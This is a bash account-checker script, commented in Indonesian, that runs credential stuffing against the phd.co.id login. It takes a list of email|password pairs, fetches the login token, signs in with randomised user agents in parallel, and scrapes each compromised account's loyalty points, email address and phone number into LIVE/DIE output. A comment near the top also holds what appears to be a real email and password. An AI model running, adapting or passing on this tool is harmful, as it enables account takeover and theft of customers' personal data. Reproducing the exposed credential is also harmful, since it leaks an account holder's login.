#!/bin/bash
#gggleg8@gmail.com|h6kx#nc_hYT?v
#https://www.phd.co.id/en/users/welcome
# hargai dong pembuat nya ga enak tau lama buat tools :((
# jika ada terjadi kesalahan perbaiki sendiri :(
green=`tput setaf 2`
reset=`tput sgr0`
other_commands() {
                rm y_* cok.log 2> /dev/null
}
trap 'other_commands' SIGINT
function agent(){
	          local agent
	          agent=$(shuf -n 1 "agent_.i")
}
#function pisah(){
#              yz=$(grep -P "identity|remember_code|phid_session" NAH_* -I|cut -d ':' -f1|uniq|grep ".txt")
#             for x in $yz;do
#                 basa
#                 break
#            done
#}
function basa(){
              none="y_log_$RANDOM"
              #cok="Z_$RANDOM"
              agent=$(agent)
              dnck=$(echo $x|cut -d "|" -f1)
              dnck2=$(echo $x|cut -d "|" -f2)
              req=$(curl -X GET -s "https://www.phd.co.id/en/users/login/1" -H "Host: www.phd.co.id" -A "$agent" --compressed -k --max-time 5 --cookie-jar $none|uniq)
              grb=$(echo -e "$req"|grep -Po "name=\"my_token\" value=\"(.*?)\""|grep -Po '(?<=value=)[a-z,0-9,\"]+'|tr -d '"')
              #for yeah in $(grep -P "phid_session" PHd_* -I|cut -d ":" -f1);do
              #grep -P "phid_session" PHd_* -I|cut -d ":" -f1 >> N00B
              #for asoy in $(cat N00B);do a=$(echo "$asoy"|grep ".txt"|uniq);done 
              req_ses=$(curl -X POST "https://www.phd.co.id/en/users/login/1" \
              -H "Host: www.phd.co.id" -A "$agent" --compressed --silent --data-urlencode "return_url=https://www.phd.co.id/en/users/welcome" --data-urlencode "my_token=$grb" --data-urlencode "username=$dnck" --data-urlencode "password=$dnck2" --data-urlencode "remember=1" -k --max-time 5 -s -b $none --cookie-jar "cok.log"|uniq)
	          # agent=()
	          # (${agent[RANDOM%${#agent[@]}]}
            #done    
             #for ELEM in ${y[@]}
             #do
             #ye=$(echo "$ELEM")
             #done
             #for line in "${y[@]}"; do
            #y=$(echo "$line") 
            #
            #for x in $(grep -P "identity|remember_code|phid_session" y_* -I|cut -d ':' -f1|uniq)
            #do
             accounts=$(curl -X GET 'https://www.phd.co.id/en/accounts' -H "Host: www.phd.co.id" -A "$agent" --compressed --max-time 5 -s -b "cok.log")
           	 nomers=$(echo -e "$accounts"|grep -Po 'telephone">(.*?)</li>'|sed -e 's/.*[^0-9]\([0-9]\+\)[^0-9]*/\1/')
           	 emailsz=$(echo -e "$accounts"|grep -Po '([-a-zA-Z0-9]+@\w+\.\w+)')
           	 points=$(echo -e "$accounts"|grep -Eo "Poin: [[:digit:]]*"|cut -d ":" -f2)
           	 home=$(curl -X GET 'https://www.phd.co.id/en/accounts' -H "Host: www.phd.co.id" --compressed -k --max-time 5 -s -b "cok.log")
             #if [[ ! -d MASOK ]]; then
             #      mkdir MASOK
             if [[ $home =~ "1" ]]; then
                    #echo "${points}|${emailsz}|${dnck2}|${nomers}"|sort -u >> live.txt
            	    printf "LIVE : ${green}%s${reset} <= %s|%s|%s\n" "${points}" "${emailsz}" "${dnck2}" "${nomers}"
             elif [[ $home =~ "0" ]]; then
                    #echo "$dnck|$dnck2" >> die.txt
                    printf "DIE : %s|%s" "${dnck}" "${dnck2}"
             fi  
             #rm -rf cok.log
           # done <<< $(grep -P "identity|remember_code|phid_session" y_* -l|cut -d ':' -f1|uniq)           
}
RD='\033[91m'; # Red
NT='\033[97m'; # Netral
read -p "List : " lst
if [ ! -f $lst ]; then
    printf "${NT}[${RD}!${NT}] ${RD}File Not Found ...\n${NT}"
	  exit 0
fi
(
for x in $(more $lst);do
    basa $dnck $dnck2 &
done
)
wait
#printf "TOTAL LIVE : %s\n" $(grep -c '' $RESULTfolder/live.txt)
#printf "TOTAL DIE : %s\n" $(grep -c '' $RESULTfolder/die.txt)